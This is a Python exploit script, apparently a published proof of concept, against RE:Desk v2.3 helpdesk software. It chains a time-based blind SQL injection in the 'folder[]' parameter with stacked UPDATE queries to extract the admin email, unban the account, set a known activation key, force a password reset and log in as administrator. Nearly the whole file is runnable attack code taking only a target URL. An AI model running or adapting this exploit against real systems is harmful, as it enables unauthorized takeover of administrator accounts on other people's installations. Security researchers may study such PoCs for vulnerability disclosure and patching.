import requests
import sys
import string
import random
import uuid
from time import sleep
from urllib.parse import urlparse

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

printable = set(string.printable)

def getBaseReference_unauth_sqli(ip, inj_str, sleep_time, i, a_to, a_from):
    headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0'}
    for j in range(a_to, a_from):
        r = ''
        payload = inj_str.replace("[TWO]", str(j))
        payload = payload.replace("[ONE]", str(i))
        target = "%s/?folder[]=%s" % (ip, payload)
        r = requests.get(target, headers=headers, proxies=proxies) 
        if (r.elapsed.total_seconds() >= sleep_time):
            return j
    return False

def set_activkey_to_known_value(ip, admin_email, rand_activkey, sleep_time):
    target = '%s/?folder[]=1337))+GROUP+BY+ticket.id)+sq%%3b+UPDATE+tbl_users+SET+activkey+=+%%22%s%%22+WHERE+email+=+%%22%s%%22%%3b+--' % (ip, rand_activkey, admin_email)
    r = requests.get(target, proxies = proxies)
    check_activkey = ("%s/?folder[]=1337))+GROUP+BY+ticket.id)+sq%%3b++SELECT+IF(((select+activkey+from+tbl_users+where+email+=+%%22%s%%22)+=+%%22%s%%22),(SELECT+sleep(%d)),'a')%%3b+--" % (ip,admin_email, rand_activkey, sleep_time))
    r_c = requests.get(check_activkey, proxies = proxies)
    if (r_c.elapsed.total_seconds() >= sleep_time):
        return True
    else:
        return False

def get_chars(limit, ip, sleep_time, injection_string, num):
    obtained_string = ''
    try:
        sys.stdout.write('[+] ')
        for i in range(1, limit):
            if num:
                extracted_char = chr(getBaseReference_unauth_sqli(ip, injection_string, sleep_time, i, 48, 58))
            else:
                extracted_char = chr(getBaseReference_unauth_sqli(ip, injection_string, sleep_time, i, 32, 127))
            sys.stdout.write(extracted_char)
            if (extracted_char != False & extracted_char.isalpha()):
                obtained_string += extracted_char
            sys.stdout.flush()
        return obtained_string
    except TypeError as te:
        return obtained_string

def reset_admin_password(ip, admin_email, activkey, new_pw):
    print_email = admin_email
    admin_email = admin_email.replace('@', '%40')
    url = '%s/user/recovery/recovery?email=%s&activkey=%s' % (ip, admin_email, activkey) #yup POST with query string
    headers = {'Content-Type' : 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0'}
    body = 'UserChangePassword%%5Bpassword%%5D=%s&UserChangePassword%%5BverifyPassword%%5D=%s&yt0=Save' % (new_pw, new_pw)
    s = requests.Session()
    r = s.post(url, data=body, headers=headers, proxies=proxies)                
    if "New password is saved." in r.text:
        print("\n[+] SUCCESS: successfully reset %s account's password" % print_email)
        print("[+] NEW CREDENTIALS: %s:%s" % (print_email, new_pw))
        return (True, s)
    else:
        print("[X] could not reset %s account password, aborting." %  print_email)
        return (False, False)

def login(ip, admin_email, new_pw):
    print_email = admin_email
    admin_email = admin_email.replace('@', '%40')
    url = '%s/user/login' % ip 
    headers = {'Content-Type' : 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0'}
    body = 'UserLogin%%5Busername%%5D=%s&UserLogin%%5Bpassword%%5D=%s&UserLogin%%5BrememberMe%%5D=0&yt0=' % (admin_email, new_pw)
    s = requests.Session()
    r = s.post(url, data=body, headers=headers, proxies=proxies)
    if "Sign out" in r.text:
        settings_url = '%s/settings' % ip
        settings_check = s.get(settings_url, proxies = proxies)
        if settings_check.status_code == 200:
            print("[+] successflly athenticated as admin with email: %s" % print_email)
            print("[+] user has adin privs!!")
            return (True, s)
        else:
            print("[+] successfully athenticated as user with email: %s" % print_email)
            return (True, s)
    else:
        print("[X] could not authenticate as %s, aborting. Try logging in through browser?")
        return (False, False)

def enable_account(ip, admin_email):
    headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0'}
    target = '%s/?folder[]=1337))+GROUP+BY+ticket.id)+sq%%3b+update+tbl_users+set+status+=+1+where+email+=+%%22%s%%22%%3b+--' % (ip, admin_email)
    r = requests.get(target,headers=headers, proxies = proxies)
    return True    

def main():
    print("\n[+] RE:Desk v2.3 unauthenticated SQLI + forced password reset (authentication bypass)")
    print("\n[!] this PoC re-sets the password to the admin account, or any account specified at run time, also enables the account if banned")
    print("[!] with no arguments, it automatically resets the admin account's password after finding the account's email via SQLi\n")
    if len(sys.argv) < 2:
        print("[!] usage: python3 %s <target> " % sys.argv[0])
        print('[!] eg: python3 %s https://example.com/redesk/' % sys.argv[0])
        print('[!] or specify an account to compromise via registed email, eg: python3 %s https://example.com/redesk/ some_user@test.com' % sys.argv[0])
        sys.exit(-1)
    ip = sys.argv[1]
    target_email = ''
    if len(sys.argv) == 3:
        target_email = sys.argv[2]
        print("[*] user option specified, will reset password for %s user account..." % target_email)
    sleep_time = 1.0 # recommend setting to over 3.0 if target is over internet/latency is high 
    rand_activkey = uuid.uuid4().hex
    new_admin_pw = uuid.uuid4().hex
    if target_email == '':
        print("[*] getting admin account email address (first one found ordered by username)...")
        # get's first superuser ordered by id asc.
        get_email_chars = "1337))+GROUP+BY+ticket.id)+sq%%3b++SELECT+IF(((ascii(substring((select+email+from+tbl_users+where+superuser+=+1+order+by+username+asc+limit+1),[ONE],1)))=[TWO]),(SELECT+sleep(%d)),'a')%%3b+--" % sleep_time
        # make sure that email address check limit length (default of 20), sleep_time, etc are sane values. 
        # set to 50 or so if really unsure/email addresses look long
        admin_email = get_chars(20,ip, sleep_time, get_email_chars, False)
        #admin_email = 'admin@nowhere.org'
        admin_email = ''.join(filter(lambda x: x in printable, admin_email))
        print("\n[+] account's email address is: %s" % admin_email)
    else:
        admin_email = target_email
    print("[*] tenatively unbanning/enabling account with email: %s (just in case)" % admin_email)
    enable_account(ip, admin_email)
    print("[*] resetting activkey for account with email: %s to random MD5 value: %s" % (admin_email, rand_activkey))
    check_activkey_result = set_activkey_to_known_value(ip, admin_email, rand_activkey, sleep_time)
    if not check_activkey_result:
        print("[X] activkey check failed, aborting")
        sys.exit(-1)
    print("[+] successfully set activkey for account with email: %s" % admin_email)
    print("[*] resetting %s account's password to: %s" % (admin_email, new_admin_pw))
    reset_admin_pw = reset_admin_password(ip, admin_email, rand_activkey, new_admin_pw)
    if reset_admin_pw[0]:
        print("\n[*] logging in as %s..." % admin_email)
        login_check = login(ip, admin_email, new_admin_pw)
        if not login_check[0]:
            sys.exit(-1)
        else:
            sys.exit(0)
    else:
        sys.exit(-1)    

if __name__ == "__main__":
    main()

